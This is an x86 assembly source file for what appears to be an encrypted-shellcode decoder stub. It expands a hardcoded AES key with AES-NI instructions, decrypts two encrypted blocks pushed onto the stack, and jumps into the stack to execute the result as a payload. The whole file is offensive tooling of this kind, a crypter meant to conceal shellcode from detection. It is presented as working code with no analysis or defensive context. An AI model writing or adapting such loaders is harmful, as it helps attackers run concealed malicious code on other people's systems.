global _start

section .text

jmp _start

key_expansion:
    pshufd xmm2, xmm2, 0xff
    
    ; Optimization from https://github.com/torvalds/linux/blob/master/arch/x86/crypto/aesni-intel_asm.S
    shufps xmm3, xmm1, 0x10
    pxor xmm1, xmm3
    shufps xmm3, xmm1, 0x8c
    
    pxor xmm1, xmm3
    pxor xmm1, xmm2
    add ebx, 0x10
    movups [ebx], xmm1
    ret
    
decrypt_block:
    movups xmm0, [esp + 0x4]            ; xmm0 = data
    movups xmm1, [ebx]                  ; xmm1 = first round key
    pxor xmm0, xmm1                     ; decrypt first round
    
    mov cl, 0x9
decrypt_loop:
    sub ebx, 0x10
    movups xmm1, [ebx]                  ; xmm1 = next round key
    aesimc xmm1, xmm1
    aesdec xmm0, xmm1                   ; decrypt next round
    loop decrypt_loop
    
    sub ebx, 0x10
    movups xmm1, [ebx]                  ; xmm1 = last round key
    aesdeclast xmm0, xmm1               ; decrypt last round
    movups [esp + 0x4], xmm0            ; store decrypted block
    ret
    
_start:
    xor eax, eax
    mov al, 0xa0
    add esp, eax                        ; allocate 10x16 bytes
    
    xor ecx, ecx
    mov cl, 0x4
push_key_loop:
    push 0x44434241                     ; "ABCD" reversed
    loop push_key_loop
    movups xmm1, [esp]                  ; xmm1 = key = "ABCDABCDABCDABCD"
    
    pxor xmm3, xmm3                     ; xmm3 = 0 (required for key expansion)
    mov ebx, esp                        ; ebx = expanded key pointer
    
    aeskeygenassist xmm2, xmm1, 0x1     ; generate round keys
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x2
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x4
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x8
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x10
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x20
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x40
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x80
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x1b
    call key_expansion
    aeskeygenassist xmm2, xmm1, 0x36
    call key_expansion
    
    push 0x86546f74                     ; push encrypted first block
    push 0x0a2f925e
    push 0xf1d0facb
    push 0x4457cd50
    call decrypt_block                  ; decrypt first block
    
    add ebx, eax                        ; reset expanded key pointer
    
    push 0x2dc431ad                     ; push encrypted second block
    push 0xff4d311d
    push 0x2fbd3b68
    push 0xb560013a
    call decrypt_block                  ; decrypt second block
    
    jmp esp                             ; execute payload 

